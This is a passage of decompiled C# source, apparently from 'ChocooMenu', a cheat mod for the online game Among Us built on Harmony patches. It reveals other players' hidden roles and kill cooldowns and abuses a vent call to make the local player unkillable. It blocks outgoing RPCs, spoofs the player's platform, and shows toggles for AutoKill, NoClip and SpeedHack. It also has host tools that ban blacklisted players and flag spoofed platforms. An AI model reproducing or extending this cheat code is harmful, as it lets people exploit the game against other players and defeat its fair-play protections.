            return $"<color=#{htmlStringRgb}>{nameTag1} <size=70%>{ChocooPlugin.PlayerNametagsPatch.GetRoleName(playerInfo)}</size></color>";
          nameTag2 = $"<color=#{htmlStringRgb}><size=70%>{ChocooPlugin.PlayerNametagsPatch.GetRoleName(playerInfo)}</size>\r\n{nameTag1}</color>";
        }
      }
      else if (flag5)
      {
        if (Color.op_Equality(PlayerControl.LocalPlayer.Data.Role.NameColor, playerInfo.Role.NameColor))
        {
          if (isChat)
            return $"<color=#{ColorUtility.ToHtmlStringRGB(playerInfo.Role.NameColor)}>{nameTag1}</color> {$"<size=70%><color=#00FF00>Lv:{num}</color> <color=#9D4EDD>({str1})</color> "}{$"<color=#00FFFF>ID {playerId}</color></size>"}";
          if (flag1)
            nameTag2 = $"{$"<size=70%><color=#FFFF00>[HOST]</color> <color=#00FFFF>ID {playerId}</color> "}{$"<color=#00FF00>Level {num}</color> <color=#9D4EDD>({str1})</color></size>\r\n"}<color=#{ColorUtility.ToHtmlStringRGB(playerInfo.Role.NameColor)}>{nameTag1}</color>\r\n<size=70%><color=#888888>{str2}</color></size>";
          else
            nameTag2 = $"{$"<size=70%><color=#00FFFF>ID {playerId}</color> "}{$"<color=#00FF00>Level {num}</color> <color=#9D4EDD>({str1})</color></size>\r\n"}<color=#{ColorUtility.ToHtmlStringRGB(playerInfo.Role.NameColor)}>{nameTag1}</color>\r\n<size=70%><color=#888888>{str2}</color></size>";
        }
        else
        {
          if (isChat)
            return $"{nameTag1} <size=70%><color=#00FF00>Lv:{num}</color> <color=#9D4EDD>({str1})</color> " + $"<color=#00FFFF>ID {playerId}</color></size>";
          if (flag1)
            nameTag2 = $"{$"<size=70%><color=#FFFF00>[HOST]</color> <color=#00FFFF>ID {playerId}</color> "}{$"<color=#00FF00>Level {num}</color> <color=#9D4EDD>({str1})</color></size>\r\n"}{nameTag1}\r\n<size=70%><color=#888888>{str2}</color></size>";
          else
            nameTag2 = $"{$"<size=70%><color=#00FFFF>ID {playerId}</color> "}{$"<color=#00FF00>Level {num}</color> <color=#9D4EDD>({str1})</color></size>\r\n"}{nameTag1}\r\n<size=70%><color=#888888>{str2}</color></size>";
        }
      }
      else
      {
        if (Color.op_Inequality(PlayerControl.LocalPlayer.Data.Role.NameColor, playerInfo.Role.NameColor) | isChat)
          return nameTag1;
        nameTag2 = $"<color=#{ColorUtility.ToHtmlStringRGB(playerInfo.Role.NameColor)}>{nameTag1}</color>";
      }
      if (ChocooPlugin.ShowKillCooldown && Object.op_Inequality((Object) ShipStatus.Instance, (Object) null) && !playerInfo.IsDead && Object.op_Inequality((Object) playerInfo.Role, (Object) null) && playerInfo.Role.CanUseKillButton)
      {
        PlayerControl playerControl = (PlayerControl) null;
        foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
        {
          if (Object.op_Inequality((Object) allPlayerControl, (Object) null) && Object.op_Inequality((Object) allPlayerControl.Data, (Object) null) && (int) allPlayerControl.PlayerId == (int) playerInfo.PlayerId)
          {
            playerControl = allPlayerControl;
            break;
          }
        }
        if (Object.op_Inequality((Object) playerControl, (Object) null))
        {
          float killTimer = playerControl.killTimer;
          string str3 = (double) killTimer >= 2.0 ? ((double) killTimer >= 5.0 ? "#FFFFFF" : "#FF7F00") : "#FF1919";
          nameTag2 = "<size=1.4><#0000>0\n</color></size>" + nameTag2 + $"\n<size=1.4><color={str3}>Kill Cooldown: {killTimer:F2}s</color>";
        }
      }
      return nameTag2;
    }

    public static string GetRoleName(NetworkedPlayerInfo playerData)
    {
      try
      {
        if (Object.op_Equality((Object) playerData?.Role, (Object) null))
          return "?";
        string roleName = DestroyableSingleton<TranslationController>.Instance.GetString(playerData.Role.StringName, Il2CppArrayBase<Object>.op_Implicit(Array.Empty<Object>()));
        if (roleName != "STRMISS")
          return roleName;
        return playerData.RoleWhenAlive.HasValue ? DestroyableSingleton<TranslationController>.Instance.GetString(((IEnumerable<RoleBehaviour>) DestroyableSingleton<RoleManager>.Instance.AllRoles.ToArray()).First<RoleBehaviour>((Func<RoleBehaviour, bool>) (r => r.Role == playerData.RoleWhenAlive.Value)).StringName, Il2CppArrayBase<Object>.op_Implicit(Array.Empty<Object>())) : "Ghost";
      }
      catch
      {
        return "?";
      }
    }

    public static string GetPlatformShortName(Platforms platform)
    {
      Platforms platforms = platform;
      switch (platforms - 1)
      {
        case 0:
          return "Epic";
        case 1:
          return "Steam";
        case 2:
          return "Mac";
        case 3:
          return "MS Store";
        case 4:
          return "Itch.io";
        case 5:
          return "iOS";
        case 6:
          return "Android";
        case 7:
          return "Switch";
        case 8:
          return "Xbox";
        case 9:
          return "Playstation";
        default:
          return platforms == 112 /*0x70*/ ? "Starlight" : "Unknown";
      }
    }
  }

  [HarmonyPatch(typeof (ChatBubble), "SetName")]
  public static class ChatNametagsPatch
  {
    [HarmonyPostfix]
    public static void Postfix(ChatBubble __instance, string playerName)
    {
      if (!ChocooPlugin.ShowPlayerInfo && ChocooPlugin.BlacklistedCodes.Count == 0)
        return;
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      try
      {
        PlayerControl player = (PlayerControl) null;
        foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
        {
          if (playerControl?.Data?.PlayerName == playerName)
          {
            player = playerControl;
            break;
          }
        }
        if (Object.op_Equality((Object) player, (Object) null) || Object.op_Equality((Object) player.Data, (Object) null))
          return;
        NetworkedPlayerInfo data = player.Data;
        int playerLevel = (int) data.PlayerLevel;
        string str1 = "?";
        string str2 = "";
        try
        {
          if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
          {
            ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(data.ClientId);
            if (client?.PlatformData != null)
            {
              if (!string.IsNullOrEmpty(ChocooPlugin.SpoofedPlatform) && (int) data.PlayerId == (int) PlayerControl.LocalPlayer.PlayerId)
              {
                if (ChocooPlugin.SpoofedPlatform.Equals("Starlight", StringComparison.OrdinalIgnoreCase))
                {
                  str1 = "Starlight";
                }
                else
                {
                  Platforms result;
                  if (Enum.TryParse<Platforms>(ChocooPlugin.SpoofedPlatform, true, out result))
                    str1 = ChocooPlugin.PlayerNametagsPatch.GetPlatformShortName(result);
                }
              }
              else
                str1 = ChocooPlugin.PlayerNametagsPatch.GetPlatformShortName(client.PlatformData.Platform);
            }
            if (client != null && client.Id == ((InnerNetClient) AmongUsClient.Instance).HostId)
              str2 = "[H] ";
          }
        }
        catch
        {
        }
        bool flag = ChocooPlugin.IsPlayerBlacklisted(player);
        string str3 = playerName;
        if (ChocooPlugin.ShowPlayerInfo || ChocooPlugin.SeeRolesEnabled)
          str3 = ChocooPlugin.PlayerNametagsPatch.GetNameTag(data, playerName, true);
        if (flag)
          str3 = "<color=#FF0000>[BL]</color> " + str3;
        if (!Object.op_Inequality((Object) __instance.NameText, (Object) null))
          return;
        ((TMP_Text) __instance.NameText).text = str3;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ChatNametags error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl))]
  public static class DisableMeetingsPatch
  {
    [HarmonyPatch("CmdReportDeadBody")]
    [HarmonyPrefix]
    public static bool CmdReportDeadBody_Prefix(
      PlayerControl __instance,
      NetworkedPlayerInfo target)
    {
      try
      {
        if (!ChocooPlugin.DisableMeetings || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
          return true;
        string str = __instance.Data?.PlayerName ?? "Unknown";
        ChocooPlugin.Logger.LogWarning((object) ("\uD83D\uDEAB Blocked meeting call from " + str));
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=yellow>[MeetingLock]</color> Meetings are disabled by host.", true);
        return false;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("DisableMeetings CmdReportDeadBody error: " + ex.Message));
        return true;
      }
    }

    [HarmonyPatch("ReportDeadBody")]
    [HarmonyPrefix]
    public static bool ReportDeadBody_Prefix(PlayerControl __instance, NetworkedPlayerInfo target)
    {
      try
      {
        return !ChocooPlugin.DisableMeetings || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("DisableMeetings ReportDeadBody error: " + ex.Message));
        return true;
      }
    }
  }

  [HarmonyPatch(typeof (VentilationSystem), "Update")]
  private class ImmortalityVentPatch
  {
    private static bool Prefix(VentilationSystem.Operation op, int ventId)
    {
      return ventId == 50 || !ChocooPlugin.BecomeImmortalEnabled || op != 2 && op != 3 && op != 4;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "MurderPlayer")]
  private class ImmortalityMurderNotification
  {
    private static void Postfix(PlayerControl __instance, PlayerControl target)
    {
      if (!ChocooPlugin.BecomeImmortalEnabled || !Object.op_Equality((Object) target, (Object) PlayerControl.LocalPlayer) || !Object.op_Inequality((Object) __instance, (Object) PlayerControl.LocalPlayer))
        return;
      DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"<color=#A020F0>[IMMORTALITY]</color> {__instance.Data.PlayerName} tried to kill you!");
    }
  }

  [HarmonyPatch(typeof (MeetingHud), "Close")]
  private class ImmortalityMeetingEnd
  {
    private static void Postfix()
    {
      if (!ChocooPlugin.BecomeImmortalEnabled || Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || PlayerControl.LocalPlayer.Data.IsDead || PlayerControl.LocalPlayer.inVent)
        return;
      VentilationSystem.Update((VentilationSystem.Operation) 2, 50);
    }
  }

  [HarmonyPatch(typeof (InnerNetClient), "DisconnectInternal")]
  private class ImmortalityDisconnect
  {
    private static void Prefix() => ChocooPlugin.BecomeImmortalEnabled = false;
  }

  [HarmonyPatch(typeof (PlayerControl), "CmdCheckColor")]
  public static class OverflowM1_BlockSendColor
  {
    [HarmonyPrefix]
    public static bool Prefix()
    {
      if (!ChocooPlugin.OverflowMethod1Enabled)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked CmdCheckColor");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "CmdCheckName")]
  public static class OverflowM1_BlockSendName
  {
    [HarmonyPrefix]
    public static bool Prefix()
    {
      if (!ChocooPlugin.OverflowMethod1Enabled)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked CmdCheckName");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetLevel")]
  public static class OverflowM1_BlockSetLevel
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetLevel");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetNamePlate")]
  public static class OverflowM1_BlockSetNamePlate
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetNamePlate");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetHat")]
  public static class OverflowM1_BlockSetHat
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetHat");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetSkin")]
  public static class OverflowM1_BlockSetSkin
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetSkin");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetPet")]
  public static class OverflowM1_BlockSetPet
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetPet");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetVisor")]
  public static class OverflowM1_BlockSetVisor
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetVisor");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetRole")]
  public static class OverflowM1_BlockSetRole
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetRole");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetScanner")]
  public static class OverflowM1_BlockSetScanner
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod1Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M1: Blocked RpcSetScanner");
      return false;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetNamePlate")]
  public static class OverflowM2_BlockSetNamePlate
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance)
    {
      if (!ChocooPlugin.OverflowMethod2Enabled || !((InnerNetObject) __instance).AmOwner)
        return true;
      ChocooPlugin.Logger.LogInfo((object) "Overflow M2: Blocked RpcSetNamePlate");
      return false;
    }
  }

  [HarmonyPatch(typeof (PingTracker), "Update")]
  public static class ChocooMenuPingTrackerPatch
  {
    private static float _smoothFps;
    private static int _smoothPing;
    private static float _updateTimer;
    private static int _gradientOffset;
    private static float _gradientTimer;

    private static string ApplyGradient(string text, int offset)
    {
      if (text.Length <= 1)
        return $"<color=#FF0000>{text}</color>";
      string str = "";
      int length = text.Length;
      for (int index = 0; index < length; ++index)
      {
        int num1 = (index + offset) % (2 * (length - 1));
        float num2 = num1 <= length - 1 ? (float) num1 / (float) (length - 1) : (float) (2 * (length - 1) - num1) / (float) (length - 1);
        byte maxValue = byte.MaxValue;
        byte num3 = (byte) Mathf.Lerp(0.0f, 153f, num2);
        byte num4 = (byte) Mathf.Lerp(0.0f, 153f, num2);
        str += $"<color=#{maxValue:X2}{num3:X2}{num4:X2}>{text[index]}</color>";
      }
      return str;
    }

    private static string ApplyPurpleGradient(string text, int offset)
    {
      if (text.Length <= 1)
        return $"<color=#5500FF>{text}</color>";
      string str = "";
      int length = text.Length;
      for (int index = 0; index < length; ++index)
      {
        int num1 = (index + offset) % (2 * (length - 1));
        float num2 = num1 <= length - 1 ? (float) num1 / (float) (length - 1) : (float) (2 * (length - 1) - num1) / (float) (length - 1);
        byte num3 = (byte) Mathf.Lerp(85f, 85f, num2);
        byte num4 = (byte) Mathf.Lerp(0.0f, 85f, num2);
        byte num5 = (byte) Mathf.Lerp((float) byte.MaxValue, (float) byte.MaxValue, num2);
        str += $"<color=#{num3:X2}{num4:X2}{num5:X2}>{text[index]}</color>";
      }
      return str;
    }

    [HarmonyPostfix]
    [HarmonyPriority(-2147483648 /*0x80000000*/)]
    public static void Postfix(PingTracker __instance)
    {
      try
      {
        ChocooPlugin.ChocooMenuPingTrackerPatch._updateTimer += Time.deltaTime;
        if ((double) ChocooPlugin.ChocooMenuPingTrackerPatch._updateTimer >= 0.5)
        {
          ChocooPlugin.ChocooMenuPingTrackerPatch._smoothFps = 1f / Time.deltaTime;
          ChocooPlugin.ChocooMenuPingTrackerPatch._smoothPing = ((InnerNetClient) AmongUsClient.Instance).Ping;
          ChocooPlugin.ChocooMenuPingTrackerPatch._updateTimer = 0.0f;
        }
        ChocooPlugin.ChocooMenuPingTrackerPatch._gradientTimer += Time.deltaTime;
        if ((double) ChocooPlugin.ChocooMenuPingTrackerPatch._gradientTimer >= 0.10000000149011612)
        {
          ++ChocooPlugin.ChocooMenuPingTrackerPatch._gradientOffset;
          ChocooPlugin.ChocooMenuPingTrackerPatch._gradientTimer = 0.0f;
        }
        int num1 = Mathf.RoundToInt(ChocooPlugin.ChocooMenuPingTrackerPatch._smoothFps);
        int smoothPing = ChocooPlugin.ChocooMenuPingTrackerPatch._smoothPing;
        string str1 = smoothPing < 80 /*0x50*/ ? "#00FF00" : (smoothPing < 400 ? "#FFFF00" : "#FF0000");
        string str2 = ChocooPlugin.ChocooMenuPingTrackerPatch.ApplyGradient("ChocooMenu", ChocooPlugin.ChocooMenuPingTrackerPatch._gradientOffset);
        string str3 = "<color=#D2DB42>v1.0.8</color>";
        string str4 = ChocooPlugin.ChocooMenuPingTrackerPatch.ApplyGradient("chocoo21", ChocooPlugin.ChocooMenuPingTrackerPatch._gradientOffset);
        string str5 = " • ";
        string str6 = ChocooPlugin.AutoKillEnabled ? str5 + "<color=#FF0000>AutoKill</color>" : "";
        string str7 = ChocooPlugin.NoClipEnabled ? str5 + "NoClip" : "";
        string str8 = ChocooPlugin.SpeedHackEnabled ? str5 + "SpeedHack" : "";
        int num2 = ((InnerNetClient) AmongUsClient.Instance).IsGameStarted ? 75 : 100;
        string str9 = "";
        if (ChocooPlugin.SpoofMenuEnabled && ChocooPlugin.selectedSpoofMenuIndex > 0 && !ChocooPlugin.StealthMode)
        {
          string text = ChocooPlugin.spoofMenuNames[ChocooPlugin.selectedSpoofMenuIndex];
          switch (text)
          {
            case "KillNetwork":
              text = "KillNetwork Mode";
              break;
            case "GoatNetClient":
              text = "GNC";
              break;
          }
          string str10 = ChocooPlugin.ChocooMenuPingTrackerPatch.ApplyPurpleGradient(text, ChocooPlugin.ChocooMenuPingTrackerPatch._gradientOffset);
          string str11 = ChocooPlugin.ChocooMenuPingTrackerPatch.ApplyPurpleGradient("[", ChocooPlugin.ChocooMenuPingTrackerPatch._gradientOffset);
          string str12 = ChocooPlugin.ChocooMenuPingTrackerPatch.ApplyPurpleGradient("]", ChocooPlugin.ChocooMenuPingTrackerPatch._gradientOffset);
          str9 = $" {str11}<i>{str10}</i>{str12}";
        }
        string str13 = $"<size={num2}%>{str2} {str3}{str9} <color=#FFFFFF>by</color> {str4} • <color=#FFFFFF>PING:</color> <color={str1}>{smoothPing} ms</color> • <color=#FFFFFF>FPS:</color> <color=#00FF00>{num1}</color>";
        if (ChocooPlugin.ShowHostEnabled && Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
        {
          string hostInfo = ChocooPlugin.ChocooMenuPingTrackerPatch.GetHostInfo();
          if (!string.IsNullOrEmpty(hostInfo))
            str13 = $"{str13} • {hostInfo}";
        }
        string str14 = str13 + str6 + str7 + str8 + "</size>";
        ((TMP_Text) __instance.text).text = str14;
        ((TMP_Text) __instance.text).alignment = (TextAlignmentOptions) 514;
        if (!((InnerNetClient) AmongUsClient.Instance).IsGameStarted)
          return;
        __instance.aspectPosition.Alignment = (AspectPosition.EdgeAlignments) 4;
        __instance.aspectPosition.DistanceFromEdge = new Vector3(-0.2f, 0.55f, 0.0f);
        __instance.aspectPosition.AdjustPosition();
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("PingTracker error: " + ex.Message));
      }
    }

    private static string GetHostInfo()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
          return "";
        ClientData host = ((InnerNetClient) AmongUsClient.Instance).GetHost();
        if (host == null)
          return "";
        string str = host.PlayerName ?? "Unknown";
        return ((InnerNetClient) AmongUsClient.Instance).AmHost ? $"<color=#FFFFFF>Host:</color> <color=#FFD700>{str}</color> <color=#00FF00>(You)</color>" : $"<color=#FFFFFF>Host:</color> <color=#FFD700>{str}</color>";
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("GetHostInfo error: " + ex.Message));
        return "";
      }
    }
  }

  [HarmonyPatch(typeof (FindAGameManager))]
  public static class FindDatersLobbyPatch
  {
    private static bool lastState;

    [HarmonyPatch("Update")]
    [HarmonyPostfix]
    public static void Update_Postfix(FindAGameManager __instance)
    {
      try
      {
        if (ChocooPlugin.FindDatersEnabled == ChocooPlugin.FindDatersLobbyPatch.lastState)
          return;
        if (ChocooPlugin.FindDatersEnabled)
        {
          ChocooPlugin.FindDatersLobbyPatch.ApplyFilters(__instance);
          ChocooPlugin.Logger.LogInfo((object) "Find Daters enabled - filters applied");
        }
        else
        {
          ChocooPlugin.FindDatersLobbyPatch.ClearFilters(__instance);
          ChocooPlugin.Logger.LogInfo((object) "Find Daters disabled - filters cleared");
        }
        ChocooPlugin.FindDatersLobbyPatch.lastState = ChocooPlugin.FindDatersEnabled;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("FindDatersLobby Update error: " + ex.Message));
      }
    }

    private static void ApplyFilters(FindAGameManager instance)
    {
      try
      {
        if (Object.op_Equality((Object) instance, (Object) null))
          return;
        instance.ClearAllFilters();
        instance.AddIntFilterValue(1, "NumImpostors", (Int32OptionNames) 1);
        for (int index = 4; index <= 9; ++index)
          instance.AddIntFilterValue(index, "MaxPlayers", (Int32OptionNames) 9);
        instance.AddChatFilterValue((QuickChatModes) 1, false);
        ChocooPlugin.Logger.LogInfo((object) "✓ Find Daters filters applied");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ApplyFilters error: " + ex.Message));
      }
    }

    private static void ClearFilters(FindAGameManager instance)
    {
      try
      {
        if (Object.op_Equality((Object) instance, (Object) null))
          return;
        instance.ClearAllFilters();
        ChocooPlugin.Logger.LogInfo((object) "✓ All filters cleared - showing all lobbies");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ClearFilters error: " + ex.Message));
      }
    }

    public static void Reset() => ChocooPlugin.FindDatersLobbyPatch.lastState = false;
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnPlayerJoined")]
  public static class BanBlacklistedOnJoinPatch
  {
    private static HashSet<int> checkedClients = new HashSet<int>();

    [HarmonyPostfix]
    public static void Postfix([HarmonyArgument(0)] ClientData client)
    {
      try
      {
        if (!ChocooPlugin.BanBlacklistedEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost || client == null || ChocooPlugin.BanBlacklistedOnJoinPatch.checkedClients.Contains(client.Id))
          return;
        ChocooPlugin.BanBlacklistedOnJoinPatch.checkedClients.Add(client.Id);
        string str1 = client.FriendCode ?? "";
        if (string.IsNullOrEmpty(str1) || !ChocooPlugin.BlacklistedCodes.Contains(str1.ToLower().Trim()))
          return;
        string str2 = client.PlayerName ?? "Unknown";
        ((InnerNetClient) AmongUsClient.Instance).KickPlayer(client.Id, true);
        ChocooPlugin.Logger.LogWarning((object) $"[BanBlacklist] Banned instantly: {str2} ({str1})");
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=red>[BanBlacklist]</color> Banned <color=orange>{str2}</color> ({str1})", true);
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"[BanBlacklist] Banned {str2} ({str1})");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("BanBlacklistedOnJoinPatch error: " + ex.Message));
      }
    }

    public static void Reset() => ChocooPlugin.BanBlacklistedOnJoinPatch.checkedClients.Clear();
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnPlayerJoined")]
  public static class DetectModUsersOnPlayerJoinPatch
  {
    [HarmonyPostfix]
    public static void Postfix([HarmonyArgument(0)] ClientData client)
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
        return;
      MonoBehaviourExtensions.StartCoroutine((MonoBehaviour) PlayerControl.LocalPlayer, ChocooPlugin.DetectModUsersOnPlayerJoinPatch.PingAndCheckCoroutine(client));
    }

    private static IEnumerator PingAndCheckCoroutine(ClientData client)
    {
      yield return (object) new WaitForSeconds(2f);
      if (!Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) && !Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
      {
        if (!ChocooPlugin.StealthMode)
        {
          ChocooPlugin.TrackOwnModUsage();
          ChocooPlugin.BroadcastMenuIdentification();
        }
        yield return (object) new WaitForSeconds(2f);
        if (Object.op_Inequality((Object) client?.Character, (Object) null))
        {
          byte pid = client.Character.PlayerId;
          if (!ChocooPlugin.detectedModUsers.ContainsKey(pid) && !ChocooPlugin.StealthMode)
            ChocooPlugin.BroadcastMenuIdentification();
        }
      }
    }
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnPlayerJoined")]
  public static class ChocooAnticheat_AbnormalPlatforms
  {
    private static HashSet<int> checkedClients = new HashSet<int>();

    [HarmonyPostfix]
    public static void Postfix([HarmonyArgument(0)] ClientData client)
    {
      try
      {
        if (!ChocooPlugin.AnticheatEnabled || !ChocooPlugin.CheckAbnormalPlatforms || client == null || ((InnerNetClient) AmongUsClient.Instance).NetworkMode == 2 || ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.checkedClients.Contains(client.Id))
          return;
        ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.checkedClients.Add(client.Id);
        PlatformSpecificData platformData = client.PlatformData;
        if (platformData == null || ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsValidPlatform(platformData))
          return;
        string str1 = client.PlayerName ?? "Unknown";
        string str2 = $"Platform: {platformData.Platform} | Name: {platformData.PlatformName} | XUID: {platformData.XboxPlatformId} | PSID: {platformData.PsnPlatformId}";
        ChocooPlugin.Logger.LogWarning((object) $"[ANTICHEAT] Spoofed Platform: {str1}{str2}");
        ChocooPlugin.detectionLog.Add(string.Format("[{0:HH:mm:ss}] {1}: Abnormal Platform ({2})", (object) DateTime.Now, (object) str1, (object) str2));
        ++ChocooPlugin.totalDetections;
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=purple>[ANTICHEAT]</color> <color=orange>{str1}</color>: Spoofed Platform detected\n<color=white><size=70%>{str2}</size></color>", true);
        if (ChocooPlugin.AutoBanEnabled && ((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ((InnerNetClient) AmongUsClient.Instance).KickPlayer(client.Id, true);
          ChocooPlugin.Logger.LogError((object) $"[ANTICHEAT] Banned {str1}for spoofed platform.");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("AbnormalPlatforms error: " + ex.Message));
      }
    }

    public static void Reset()
    {
      ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.checkedClients.Clear();
    }

    public static bool IsValidPlatform(PlatformSpecificData platform)
    {
      string platformName = platform.PlatformName;
      ulong xboxPlatformId = platform.XboxPlatformId;
      ulong psnPlatformId = platform.PsnPlatformId;
      Platforms platform1 = platform.Platform;
      switch (platform1 - 1)
      {
        case 0:
        case 1:
        case 2:
        case 4:
        case 5:
        case 6:
          if (ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsGenericPlatformName(platformName) && xboxPlatformId == 0UL && psnPlatformId == 0UL)
            return true;
          break;
        case 3:
          if (ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsGenericPlatformName(platformName) && xboxPlatformId != 0UL && psnPlatformId == 0UL)
            return true;
          break;
        case 7:
          if (!ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsGenericPlatformName(platformName) && xboxPlatformId == 0UL && psnPlatformId == 0UL)
            return true;
          break;
        case 8:
          if (!ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsGenericPlatformName(platformName) && platformName.Length >= 3 && platformName.Length <= 16 /*0x10*/ && xboxPlatformId != 0UL && psnPlatformId == 0UL)
            return true;
          break;
        case 9:
          if (!ChocooPlugin.ChocooAnticheat_AbnormalPlatforms.IsGenericPlatformName(platformName) && xboxPlatformId == 0UL && psnPlatformId > 0UL)
            return true;
          break;
        default:
          if (platform1 == (int) byte.MaxValue && ((InnerNetClient) AmongUsClient.Instance).NetworkMode == 0)
            return true;
          break;
      }
      return false;
    }

    public static bool IsGenericPlatformName(string platformName) => platformName == "TESTNAME";
  }

  [HarmonyPatch(typeof (PlayerControl), "FixedUpdate")]
  public static class KeepProtectingAllPatch
  {
    public static void Postfix()
    {
      if (!ChocooPlugin.KeepProtectingAllEnabled || (double) Time.time - (double) ChocooPlugin.lastProtectTime < 1.0)
        return;
      ChocooPlugin.lastProtectTime = Time.time;
